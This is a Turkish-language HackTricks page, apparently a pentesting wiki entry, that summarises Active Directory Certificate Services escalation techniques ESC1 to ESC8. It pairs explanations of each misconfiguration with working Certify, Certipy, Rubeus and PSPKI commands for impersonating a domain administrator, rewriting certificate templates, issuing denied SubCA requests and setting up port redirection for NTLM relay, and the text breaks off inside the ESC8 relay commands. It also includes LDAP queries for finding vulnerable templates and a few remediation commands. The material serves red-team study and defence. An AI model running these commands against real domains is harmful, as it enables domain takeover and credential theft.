# AD CS Domain Yükseltme

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Bu, yazıların yükseltme teknikleri bölümlerinin özetidir:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

* **Düşük ayrıcalıklı kullanıcılara Kurumsal CA tarafından kayıt hakları verilir.**
* **Yönetici onayı gerekli değildir.**
* **Yetkili personel imzaları gerekmeksizin.**
* **Sertifika şablonlarındaki güvenlik tanımlayıcıları aşırı derecede izin verici olup, düşük ayrıcalıklı kullanıcıların kayıt haklarını elde etmelerine izin verir.**
* **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlamak üzere yapılandırılmıştır:**
* Uzatılmış Anahtar Kullanımı (EKU) tanımlayıcıları, Müşteri Kimlik Doğrulaması (OID 1.3.6.1.5.5.7.3.2), PKINIT Müşteri Kimlik Doğrulaması (1.3.6.1.5.2.3.4), Akıllı Kart Girişi (OID 1.3.6.1.4.1.311.20.2.2), Herhangi Bir Amaç (OID 2.5.29.37.0) veya EKU olmayan (AltCA) gibi dahil edilir.
* **İsteyenlerin Sertifika İmzalama İsteği'nde (CSR) bir subjectAltName eklemesine izin verilir:**
* Eğer mevcutsa, Active Directory (AD) bir sertifikadaki subjectAltName (SAN) önceliğini kimlik doğrulama için kullanır. Bu, bir CSR'da SAN'ı belirterek, bir sertifika isteyicisinin herhangi bir kullanıcıyı (örneğin, bir etki alanı yöneticisini) taklit etmek için bir sertifika isteyebileceği anlamına gelir. Bir SAN'ın isteyen tarafından belirtilebilip belirtilemeyeceği, sertifika şablonunun AD nesnesinde `mspki-certificate-name-flag` özelliği aracılığıyla belirtilir. Bu özellik bir bit maskesidir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, isteyenin SAN'ı belirtmesine izin verir.

{% hint style="danger" %}
Belirtilen yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifikaları talep etmelerine izin verir, böylece Kerberos veya SChannel aracılığıyla herhangi bir etki alanı prensibi olarak kimlik doğrulaması yapabilirler.
{% endhint %}

Bu özellik bazen, ürünlerin veya dağıtım hizmetlerinin HTTPS veya ana bilgisayar sertifikalarının anlık olarak oluşturulmasını desteklemek veya anlayış eksikliğinden dolayı etkinleştirilir.

Bu seçeneği etkinleştirmenin, var olan bir sertifika şablonu (örneğin, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` özelliğine sahip olan `WebServer` şablonu) çoğaltıldığında ve ardından kimlik doğrulama OID'si içerecek şekilde değiştirildiğinde bir uyarı tetiklediği, bu durumun mevcut olmadığına dikkat edilmelidir.

### Kötüye Kullanım

**Zararlı sertifika şablonlarını bulmak** için şunları çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**Bu zafiyeti kötüye kullanarak bir yöneticiyi taklit etmek** için şunu çalıştırabilirsiniz:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Sonra üretilen **sertifikayı `.pfx`** formatına dönüştürebilir ve tekrar **Rubeus veya certipy kullanarak kimlik doğrulaması yapabilirsiniz**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe" PFX'i oluşturmak için kullanılabilir: [https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee](https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee)

AD Ormanı yapılandırma şemasındaki sertifika şablonlarının numaralandırılması, onay veya imza gerektirmeyen, Müşteri Kimlik Doğrulaması veya Akıllı Kart Girişi EKU'ya sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının etkin olduğu belirli sertifika şablonları, aşağıdaki LDAP sorgusunu çalıştırarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu birinci senaryonun bir varyasyonudur:

1. Kurumsal CA tarafından düşük ayrıcalıklı kullanıcılara kayıt hakları verilir.
2. Yönetici onayı gereksinimi devre dışı bırakılmıştır.
3. Yetkili imzaların gerekliliği ihmal edilmiştir.
4. Sertifika şablonundaki aşırı derecede izin verici güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kayıt hakları verir.
5. **Sertifika şablonu, Her Amaçlı EKU'yu veya hiçbir EKU'yu içerecek şekilde tanımlanmıştır.**

**Her Amaçlı EKU**, bir saldırganın istemci kimlik doğrulama, sunucu kimlik doğrulama, kod imzalama vb. dahil olmak üzere **herhangi bir amaç** için sertifika almasına izin verir. Bu senaryoyu sömürmek için **ESC3 için kullanılan teknik** aynı şekilde kullanılabilir.

**Hiçbir EKU**'ya sahip sertifikalar, alt CA sertifikaları olarak hareket eder ve **herhangi bir amaç** için sömürülebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle, bir saldırgan alt CA sertifikasını kullanarak yeni sertifikalarda keyfi EKU'ları veya alanları belirtebilir.

Ancak, **alan kimlik doğrulaması** için oluşturulan yeni sertifikalar, **varsayılan ayar olan `NTAuthCertificates`** nesnesi tarafından güvenilmiyorsa işlev görmeyecektir. Bununla birlikte, bir saldırgan hala **herhangi bir EKU ve keyfi sertifika değerleri ile yeni sertifikalar oluşturabilir**. Bu, geniş bir amaçlar yelpazesinde (örneğin, kod imzalama, sunucu kimlik doğrulama vb.) **kötüye kullanılabilecek** ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçları olabilir.

Bu senaryoya uyan şablonları AD Ormanı yapılandırma şeması içinde sıralamak için aşağıdaki LDAP sorgusu çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Kayıt Ajan Şablonları - ESC3

### Açıklama

Bu senaryo, farklı bir EKU'yu (Sertifika İsteği Ajanı) istismar ederek ve **2 farklı şablon** kullanarak ilk ve ikinci senaryoya benzerdir (bu nedenle 2 farklı gereksinim setine sahiptir).

Microsoft belgelerinde **Kayıt Ajanı** olarak bilinen **Sertifika İsteği Ajanı EKU** (OID 1.3.6.1.4.1.311.20.2.1), bir başka kullanıcı adına sertifika için bir başka kullanıcı adına **kayıt olmasına izin verir**.

**"kayıt ajanı"**, bu tür bir **şablona kaydolur** ve sonuçta oluşan **sertifikayı diğer kullanıcı adına bir CSR'yi işaretlemek için kullanır**. Daha sonra **işaretlenmiş CSR'yi** CA'ya gönderir, "başkası adına kaydol" izni veren bir **şablona kaydolur** ve CA, "diğer" kullanıcıya ait bir **sertifika ile yanıt verir**.

**Gereksinimler 1:**

* Kurumsal CA tarafından düşük ayrıcalıklı kullanıcılara kayıt hakları verilmiştir.
* Yönetici onayı gereksinimi atlanmıştır.
* Yetkili imzalar için gereksinim yoktur.
* Sertifika şablonunun güvenlik tanımlayıcısı aşırı derecede izin verici olup, düşük ayrıcalıklı kullanıcılara kayıt hakları vermektedir.
* Sertifika şablonu, Sertifika İsteği Ajanı EKU'yu içerir ve diğer prensipler adına diğer sertifika şablonlarını isteme olanağı sağlar.

**Gereksinimler 2:**

* Kurumsal CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
* Yönetici onayı atlanır.
* Şablonun şema sürümü 1 veya 2'yi aşar ve Sertifika İsteği Ajanı EKU'yu gerektiren bir Uygulama Politikası İhraç Gereksinimi belirtir.
* Sertifika şablonunda tanımlanan bir EKU, etki alanı kimlik doğrulamasına izin verir.
* Kayıt ajanları için kısıtlamalar CA üzerinde uygulanmaz.

### Kötüye Kullanım

Bu senaryoyu istismar etmek için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Kullanıcılara** **bir** **kayıt acentesi sertifikası almak** için izin verilen, kayıt **ajanlarının** kayıt olmasına izin verilen şablonlar ve kayıt acentesi olarak hareket edebilecek **hesaplar** kurumsal CA'lar tarafından kısıtlanabilir. Bu, `certsrc.msc` **snap-in**'i açarak, CA'ya **sağ tıklayarak**, **Özellikler**'i tıklayarak ve ardından "Kayıt Acenteleri" sekmesine **gezerek** başarılır.

Ancak, CA'lar için **varsayılan** ayarın "Kayıt acentelerini kısıtlama" olmadığı **belirtilmektedir**. Yöneticiler tarafından kayıt acentelerine kısıtlama getirildiğinde, bunu "Kayıt acentelerini kısıtla" olarak ayarlamak, varsayılan yapılandırmanın son derece geniş kapsamlı kalmasını sağlar. Herkese tüm şablonlara kayıt olma izni verir.

## Zayıf Sertifika Şablonu Erişim Kontrolü - ESC4

### **Açıklama**

**Sertifika şablonlarındaki** **güvenlik tanımlayıcısı**, şablonla ilgili **AD prensiplerinin** sahip olduğu **izinleri** tanımlar.

Bir **saldırganın** bir **şablonu değiştirme** ve **önceki bölümlerde belirtilen** herhangi bir **sömürülebilir yapılandırmayı** **kurma** yetkisine sahip olması durumunda, ayrıcalık yükseltmesi kolaylaştırılabilir.

Sertifika şablonlarına uygulanabilen dikkate değer izinler şunlardır:

* **Sahip:** Nesne üzerindeki denetimi sağlar ve herhangi bir özelliği değiştirme yeteneği verir.
* **Tam Kontrol:** Nesne üzerinde tam yetki sağlar, tüm özellikleri değiştirme yeteneği dahil.
* **WriteOwner:** Nesnenin sahibini saldırganın kontrolündeki bir prensibe değiştirme izni verir.
* **WriteDacl:** Erişim kontrollerini ayarlama izni verir ve saldırganın Tam Kontrol yetkisini almasına olanak tanır.
* **WriteProperty:** Herhangi bir nesne özelliğini düzenlemeyi yetkilendirir.

### Kötüye Kullanım

Önceki gibi bir ayrıcalık yükseltme örneği:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma izinlerine sahip olduğu durumdur. Bu örneğin, sertifika şablonunun yapılandırmasını üzerine yazmak suretiyle şablonun ESC1'e karşı savunmasız hale getirilmesi şeklinde kötüye kullanılabilir.

Yukarıdaki yolculukta, yalnızca `JOHNPC`'nin bu izinlere sahip olduğunu görebiliriz, ancak kullanıcımız `JOHN`, `JOHNPC`'ye yeni `AddKeyCredentialLink` kenarını eklemiştir. Bu teknik sertifikalarla ilgili olduğundan, bu saldırıyı da uyguladım, ki bu da [Gölge Kimlik Bilgileri](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen bir saldırıdır. İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` komutunun küçük bir önizlemesi.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, bir komutla bir sertifika şablonunun yapılandırmasını üzerine yazabilir. **Varsayılan olarak**, Certipy, yapılandırmayı **ESC1'e karşı savunmasız hale getirecek şekilde üzerine yazar**. Ayrıca **`-save-old` parametresini belirterek eski yapılandırmayı kaydedebiliriz**, bu da saldırımızdan sonra yapılandırmayı **geri yüklemek için** faydalı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Zayıf PKI Nesne Erişim Kontrolü - ESC5

### Açıklama

Sertifika şablonları ve sertifika yetkilisi ötesinde birçok nesneyi içeren geniş ACL tabanlı ilişkiler ağı, AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunları içerir:

* CA sunucusunun AD bilgisayar nesnesi, S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla tehlikeye atılabilir.
* CA sunucusunun RPC/DCOM sunucusu.
* Belirli bir konteyner yolundaki (`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`) herhangi bir alt AD nesnesi veya konteyner. Bu yol, Sertifika Şablonları konteyneri, Sertifika Yetkilileri konteyneri, NTAuthCertificates nesnesi ve Enrollment Services Konteyneri gibi konteynerleri ve nesneleri içerir ancak bunlarla sınırlı değildir.

PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırganın bu kritik bileşenlerden herhangi biri üzerinde kontrol sağlamayı başarması durumunda tehlikeye girebilir.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) tartışılan konu, Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerine de değinmektedir. Bu yapılandırma, bir Sertifika Yetkilisi (CA) üzerinde etkinleştirildiğinde, **kullanıcı tanımlı değerlerin** **konu alternatif adı** içine **dahil edilmesine** izin verir. Bu, Active Directory® tarafından oluşturulan talepler de dahil olmak üzere **herhangi bir talep** için geçerlidir. Sonuç olarak, bu düzenek, bir **saldırganın** domain **kimlik doğrulaması** için kurulmuş **herhangi bir şablon** üzerinden kaydolmasına izin verir—özellikle standart Kullanıcı şablonu gibi **ayrıcalıksız** kullanıcı kaydına açık olanlar. Bu sayede, bir sertifika güvence altına alınabilir ve saldırganın etki alanındaki bir etki alanı yöneticisi veya **herhangi başka bir etkin varlık** olarak kimlik doğrulaması yapmasına olanak tanır.

**Not**: `-attrib "SAN:"` argümanıyla bir Sertifika İmzalama İsteği'ne (CSR) **alternatif adlar** eklemek için kullanılan yaklaşım, ESC1'deki SAN'ların sömürülme stratejisinden **farklılık** gösterir. Buradaki fark, **hesap bilgilerinin nasıl kapsüllendiği**—bir sertifika özniteliği içinde, bir uzantı yerine.

### Kötüye Kullanım

Ayarın etkinleştirilip etkinleştirilmediğini doğrulamak için kuruluşlar, aşağıdaki komutu `certutil.exe` ile kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem temelde **uzak kayıt defteri erişimi** kullanır, dolayısıyla alternatif bir yaklaşım şöyle olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Aşağıdaki gibi araçlar [**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) bu yan yapılandırmayı tespit etme ve sömürme yeteneğine sahiptir:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **alan yönetici** haklarına veya buna eşdeğer haklara sahip olduğunuzu varsayarak, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için bayrak şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Mayıs 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar**, **isteyenin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** içerecektir. ESC1 için bu SID belirtilen SAN'dan türetilir. Ancak **ESC6** için, SID isteyenin `objectSid`'ini yansıtır, SAN değil.\
ESC6'yı sömürmek için, sistemin **ESC10'a (Zayıf Sertifika Eşlemeleri) duyarlı olması** gereklidir, bu da **SAN'ı yeni güvenlik uzantısının üzerine tercih eder**.
{% endhint %}

## Zayıf Sertifika Yetkilisi Erişim Kontrolü - ESC7

### Saldırı 1

#### Açıklama

Bir sertifika yetkilisi için erişim kontrolü, CA işlemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler, `certsrv.msc`'ye erişilerek, bir CA'ya sağ tıklanarak, özelliklerin seçilmesi ve ardından Güvenlik sekmesine gidilerek görüntülenebilir. Ayrıca, izinler PSPKI modülü kullanılarak şu gibi komutlarla sıralanabilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, öncelikli haklar olan **`ManageCA`** ve **`ManageCertificates`** ile ilişkilendirilen "CA yöneticisi" ve "Sertifika Yöneticisi" rollerine dair içgörüler sağlar.

#### Kötüye Kullanım

Bir sertifika otoritesinde **`ManageCA`** haklarına sahip olmak, PSPKI kullanarak uzaktan ayarları manipüle etme olanağı sağlar. Bu, herhangi bir şablon içinde SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını açma işlevini içerir, alan yükseltmenin kritik bir yönüdür.

Bu sürecin basitleştirilmesi, PSPKI'nın **Enable-PolicyModuleFlag** cmdlet'inin kullanımıyla doğrudan GUI etkileşimi olmadan değişiklikler yapılmasını sağlar.

**`ManageCertificates`** haklarına sahip olmak, bekleyen isteklerin onaylanmasını kolaylaştırır ve etkili bir şekilde "CA sertifika yöneticisi onayı" korumasını atlar.

**Certify** ve **PSPKI** modüllerinin bir kombinasyonu, bir sertifika talep etmek, onaylamak ve indirmek için kullanılabilir:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

{% hint style="warning" %}
Önceki saldırıda **`Yönet CA`** izinleri kullanılarak **EDITF\_ATTRIBUTESUBJECTALTNAME2** bayrağını etkinleştirmek için **ESC6 saldırısını** gerçekleştirmek için CA hizmeti (`CertSvc`) yeniden başlatılana kadar herhangi bir etkisi olmayacaktır. Bir kullanıcı **Yönet CA** erişim hakkına sahip olduğunda, kullanıcı aynı zamanda **hizmeti yeniden başlatma** iznine de sahiptir. Ancak, bu, kullanıcının hizmeti uzaktan yeniden başlatabileceği anlamına gelmez. Ayrıca, **Mayıs 2022 güvenlik güncellemeleri nedeniyle çoğu yamalı ortamda ESC6'nın çalışmayabileceği** unutulmamalıdır.
{% endhint %}

Bu nedenle, burada başka bir saldırı sunulmaktadır.

Önkoşullar:

- Yalnızca **`ManageCA` izni**
- **`Manage Certificates`** izni ( **`ManageCA`** üzerinden verilebilir)
- Sertifika şablonu **`SubCA`** etkin olmalıdır ( **`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika istekleri** verebileceği gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1'e** karşı savunmasızdır, ancak **yalnızca yöneticiler** şablona kaydolabilir. Bu nedenle, bir **kullanıcı**, **`SubCA`**'ya kaydolma **istekte bulunabilir** - bu **reddedilecektir** - ancak **ardından yönetici tarafından verilecektir**.

#### Kötüye Kullanım

Kullanıcıyı yeni bir yetkili olarak ekleyerek kendinize **`Manage Certificates`** erişim hakkını **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu, CA üzerinde `-enable-template` parametresi ile etkinleştirilebilir. Varsayılan olarak, `SubCA` şablonu etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Eğer bu saldırı için gerekli koşulları yerine getirdiysek, **`SubCA` şablonuna dayalı bir sertifika isteyerek** başlayabiliriz.

**Bu istek reddedilecek**, ancak özel anahtarı kaydedecek ve istek kimliğini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Yönet CA` ve `Sertifikaları Yönet`** ile ardından `ca` komutu ve `-issue-request <istek Kimliği>` parametresi ile **başarısız olan sertifika** isteğini **verebiliriz**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresi ile **verilen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Aktarımı AD CS HTTP Uç Noktaları - ESC8

### Açıklama

{% hint style="info" %}
**AD CS kurulu** ortamlarda, **savunmasız bir web kayıt ucu varsa** ve en az bir **sertifika şablonu yayınlanmışsa** ve **alan bilgisayar kaydı ve istemci kimlik doğrulamasına izin veriyorsa** (örneğin varsayılan **`Machine`** şablonu gibi), **spooler servisi etkin olan herhangi bir bilgisayarın bir saldırgan tarafından ele geçirilmesi mümkün hale gelir**!
{% endhint %}

AD CS tarafından desteklenen birkaç **HTTP tabanlı kayıt yöntemi**, yöneticilerin kurabileceği ek sunucu rolleri aracılığıyla sunulmaktadır. Bu HTTP tabanlı sertifika kaydı arabirimleri, **NTLM aktarım saldırılarına** karşı hassastır. Bir saldırgan, **ele geçirilmiş bir makineden, gelen NTLM üzerinden kimlik doğrulayan herhangi bir AD hesabını taklit edebilir**. Kurban hesabı taklit edilirken, bu web arabirimlerine saldırgan tarafından **`User` veya `Machine` sertifika şablonlarını kullanarak istemci kimlik doğrulama sertifikası talep edilebilir**.

- **Web kayıt arabirimi** (bir önceki ASP uygulaması olan `http://<casunucusu>/certsrv/`), yalnızca HTTP ile varsayılan olarak gelir, bu da NTLM aktarım saldırılarına karşı koruma sağlamaz. Ayrıca, yalnızca NTLM kimlik doğrulamasına izin verir ve Kerberos gibi daha güvenli kimlik doğrulama yöntemlerini kullanılamaz hale getirir.
- **Sertifika Kayıt Hizmeti** (CES), **Sertifika Kayıt Politikası** (CEP) Web Servisi ve **Ağ Cihazı Kayıt Hizmeti** (NDES) varsayılan olarak yetkilendirme HTTP başlıkları aracılığıyla müzakere kimlik doğrulamasını destekler. Müzakere kimlik doğrulaması, hem Kerberos hem de **NTLM**'yi destekler ve bir saldırganın aktarım saldırıları sırasında **NTLM'ye düşürülmesine izin verir**. Bu web hizmetleri varsayılan olarak HTTPS'yi destekler, ancak yalnızca HTTPS, NTLM aktarım saldırılarına karşı koruma sağlamaz. HTTPS hizmetlerinin NTLM aktarım saldırılarından korunması, HTTPS'nin kanal bağlamayla birleştirilmesi durumunda mümkündür. Ne yazık ki, AD CS, kanal bağlaması için gereken IIS üzerinde Genişletilmiş Kimlik Doğrulama Korumasını etkinleştirmez.

NTLM aktarım saldırılarının yaygın bir **sorunu**, NTLM oturumlarının **kısa süreli olması** ve saldırganın **NTLM imzalama gerektiren hizmetlerle etkileşime girememesi**dir.

Yine de, bu kısıtlama, bir NTLM aktarım saldırısını kullanarak bir kullanıcı için bir sertifika elde etmek suretiyle aşılır, çünkü sertifikanın geçerlilik süresi oturum süresini belirler ve sertifika, **NTLM imzalama gerektiren hizmetlerde kullanılabilir**. Çalınan bir sertifika kullanımı hakkında talimatlar için şu adrese bakın:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM aktarım saldırılarının bir diğer kısıtlaması, **bir saldırgan tarafından kontrol edilen bir makinenin bir kurban hesabı tarafından kimlik doğrulanması gerekliliğidir**. Saldırgan bu kimlik doğrulamayı **bekleyebilir veya zorlayabilir**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)’nin `cas`'ı **etkin HTTP AD CS uç noktalarını** sıralar:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, Kurumsal Sertifika Otoriteleri (CAs) tarafından Sertifika Kayıt Hizmeti (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar, **Certutil.exe** aracını kullanarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

#### Yetkilendirme ile Kötüye Kullanım
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
